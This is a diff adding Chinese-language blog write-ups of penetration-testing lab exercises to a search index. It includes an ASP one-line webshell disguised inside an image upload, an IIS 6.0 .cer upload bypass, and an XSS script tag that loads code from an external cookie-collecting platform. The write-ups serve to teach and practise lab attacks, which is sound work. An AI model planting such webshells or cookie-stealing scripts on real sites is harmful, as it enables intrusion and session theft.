@@ -1,6 +1,87 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>靶机第五题</title>
+    <url>/2019/12/20/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="靶机第五题"><a href="#靶机第五题" class="headerlink" title="靶机第五题"></a>靶机第五题</h2><p>先用第四题中获得的cookie进入</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 修改cookie.png" alt="cookie进入"></p>
+<p>进入后台管理系统，然后先逛一逛，看看有没有可以上传图片或者文件的地方</p>
+<p>然后发现了好几个上传图片的地方，上传一个PHP看看</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 上传木马.png" alt=""></p>
+<p>跳转到我们的结果</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 上传木马2.png" alt=""></p>
+<p>结果php文件不能被上传，于是我们按着上面给的限制来，于是上传图片马</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 上传图片马.png" alt=""></p>
+<p><code>&lt;%eval request (&quot;pass&quot;)%&gt;</code></p>
+<p>然后用菜刀进入</p>
+<p>返回了一个失败的弹窗</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 菜刀进入失败.png" alt=""></p>
+<p>404  然后IIS6.0</p>
+<p>于是我们选择上传cer文件</p>
+<p>菜刀进入</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 发现flag.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机第四题</title>
+    <url>/2019/12/19/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%9B%9B%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="靶机第四题"><a href="#靶机第四题" class="headerlink" title="靶机第四题"></a>靶机第四题</h2><h3 id="发现进去就是一个留言板"><a href="#发现进去就是一个留言板" class="headerlink" title="发现进去就是一个留言板"></a>发现进去就是一个留言板</h3><p>留言板一般和XSS有关，但是不知道是什么限制，可能是字符限制</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 留言板测试.png" alt=""></p>
+<p>对其进行测试发现，没有对字符进行限制</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 留言板发现有xss.png" alt=""></p>
+<p>弹出了我们想要的提醒</p>
+<p>这个时候我们需要一个XSS平台，进行渗透</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 xss平台.png" alt=""></p>
+<p>这个平台可以给我们一个地址，然后渗透结果回返回</p>
+<p>图片探针（记录referer，IP，浏览器等信息）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xsspt.com&#x2F;zEtYPN.jpg</span></pre></td></tr></table></figure>
+<p>将如下代码植入怀疑出现xss的地方（注意’的转义），即可在<a href="http://xsspt.com/index.php?do=project&amp;act=view&amp;id=57267" target="_blank" rel="noopener">项目内容</a>观看XSS效果。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src &#x3D; http：&#x2F;&#x2F;xsspt.com&#x2F;zEtYPN&gt; &lt;&#x2F; script&gt;</span></pre></td></tr></table></figure>
+<p>或者以你任何想要的方式插入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xsspt.com&#x2F;zEtYPN</span></pre></td></tr></table></figure>
+<p>XSS返回了我们想要的结果</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 XSS平台结果.png" alt=""></p>
+<p>注 一个小技巧</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 小技巧.png" alt=""></p>
+<p>这里有一个小技巧，可以发现XSS到底有没有运行</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>cookie</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机第三题</title>
+    <url>/2019/12/19/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%B8%89%E9%A2%98/</url>
+    <content><![CDATA[<p>title: 靶机第三题<br>date: 2019-12-19 16:35:43<br>tags:</p>
+<ul>
+<li>渗透</li>
+<li>CSRF<br>categories:</li>
+<li>渗透</li>
+</ul>
+<h2 id="靶机第三题"><a href="#靶机第三题" class="headerlink" title="靶机第三题"></a>靶机第三题</h2><h3 id="登录后台发现问题"><a href="#登录后台发现问题" class="headerlink" title="登录后台发现问题"></a>登录后台发现问题</h3><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第三题 进入后失败.png" alt="进入后失败"></p>
+<h3 id="用BP-进行修改"><a href="#用BP-进行修改" class="headerlink" title="用BP 进行修改"></a>用BP 进行修改</h3><p>先放通  发现过去了哪些地址</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第三题 bp拦截1.png" alt=""></p>
+<p>对其中一个进行修改 ，有些gif，ico，login就可以不用管的</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第三题 bp拦截2.png" alt=""></p>
+<p>对于一个不熟悉的left tree 进行修改，然后查看返回结果</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第三题 bp拦截3.png" alt=""></p>
+<p>查看defalt修改后的返回结果</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第三题 bp拦截4.png" alt=""></p>
+<p>其实，flag 在对sysadmin修改端口后就出现了，其他修改是实验</p>
+]]></content>
+  </entry>
+  <entry>
     <title>SQL注入第三题</title>
     <url>/2019/12/18/SQL%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E9%A2%98/</url>
     <content><![CDATA[<h3 id="SQL注入第三题"><a href="#SQL注入第三题" class="headerlink" title="SQL注入第三题"></a>SQL注入第三题</h3><p>错误注入 返回的</p>
@@ -554,8 +635,8 @@
         <category>吃饭</category>
       </categories>
       <tags>
-        <tag>渗透</tag>
         <tag>burp</tag>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
